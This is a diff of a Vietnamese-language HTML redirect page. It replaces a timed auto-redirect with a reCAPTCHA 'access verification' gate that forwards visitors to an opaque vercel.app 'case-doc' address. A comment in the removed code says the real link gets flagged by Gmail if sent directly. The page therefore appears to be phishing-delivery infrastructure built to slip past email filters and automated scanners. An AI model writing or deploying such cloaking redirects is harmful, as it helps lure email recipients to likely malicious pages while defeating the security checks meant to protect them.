@@ -1,37 +1,64 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="vi">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Redirecting...</title>
-  <meta name="robots" content="noindex, nofollow" />
+  <title>Xác minh truy cập</title>
+  <meta name="robots" content="noindex, nofollow">
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: #f2f2f2;
+      background: #f5f5f5;
       text-align: center;
       padding-top: 100px;
     }
-    .notice {
-      background: white;
+    .box {
+      background: #fff;
       padding: 30px;
       display: inline-block;
       border-radius: 10px;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
+    button {
+      margin-top: 20px;
+      padding: 10px 20px;
+      font-weight: bold;
+      border: none;
+      background: #0057b7;
+      color: white;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    button:disabled {
+      background: #aaa;
+      cursor: not-allowed;
+    }
   </style>
 </head>
 <body>
-  <div class="notice">
-    <h2>Please wait...</h2>
-    <p>You are being redirected to the requested document.</p>
+  <div class="box">
+    <h2>🔒 Vui lòng xác minh</h2>
+    <p>Bạn cần xác nhận không phải là robot để tiếp tục.</p>
+
+    <!-- Gắn site key bạn cung cấp -->
+    <div class="g-recaptcha"
+         data-sitekey="6LfR_AQrAAAAAErKfNV-5JCr7bBmgQYrj33Dda4B"
+         data-callback="recaptchaSuccess">
+    </div>
+
+    <button id="continue" onclick="go()" disabled>Tiếp tục</button>
   </div>
 
   <script>
-    setTimeout(() => {
-      // Link thật bị Gmail flag nếu gửi trực tiếp
+    function recaptchaSuccess() {
+      document.getElementById("continue").disabled = false;
+    }
+
+    function go() {
+      // 👉 Link đích cuối cùng
       window.location.href = "https://case-doc-kc2o.vercel.app/";
-    }, 3000);
+    }
   </script>
 </body>
 </html>
